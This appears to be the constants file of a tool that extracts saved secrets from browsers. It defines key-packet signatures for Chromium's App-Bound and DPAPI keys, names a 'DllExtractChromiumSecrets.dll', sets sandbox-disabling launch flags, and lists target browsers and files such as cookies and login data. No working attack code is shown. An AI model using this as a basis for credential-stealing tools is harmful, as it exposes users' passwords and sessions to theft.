import os

# Application Constraints
INITIAL_ARRAY_CAPACITY = 100
BUFFER_SIZE_8192 = 8192
BUFFER_SIZE_32 = 32
PIPE_THREAD_TIMEOUT = 60000  # 60 seconds

# Packet Signatures
# Packet Signatures
PACKET_SIG_APP_BOUND_KEY = 0x594b4241 # 'YKBA' -> ABKY
PACKET_SIG_DPAPI_KEY = 0x594b4450 # 'YKDP' -> PDKY

# DLL Name
STR_DLL_NAME = "DllExtractChromiumSecrets.dll"

# Chromium Arguments
STR_CHROMIUM_ARGS = "--no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11"

# Supported Browsers
class BrowserType:
    UNKNOWN = "unknown"
    CHROME = "chrome"
    EDGE = "edge"
    BRAVE = "brave"
    OPERA = "opera"
    OPERA_GX = "operagx"
    VIVALDI = "vivaldi"
    FIREFOX = "firefox"

BROWSER_NAMES = {
    BrowserType.CHROME: "Google Chrome",
    BrowserType.EDGE: "Microsoft Edge",
    BrowserType.BRAVE: "Brave Browser",
    BrowserType.OPERA: "Opera Browser",
    BrowserType.OPERA_GX: "Opera GX Browser",
    BrowserType.VIVALDI: "Vivaldi Browser",
    BrowserType.FIREFOX: "Mozilla Firefox",
}

# File Types (Chromium)
FILE_TYPE_COOKIES = "cookies"
FILE_TYPE_HISTORY = "history"
FILE_TYPE_LOGIN_DATA = "login_data"
FILE_TYPE_WEB_DATA = "web_data"
FILE_TYPE_BOOKMARKS = "bookmarks"
FILE_TYPE_LOCAL_STATE = "local_state"
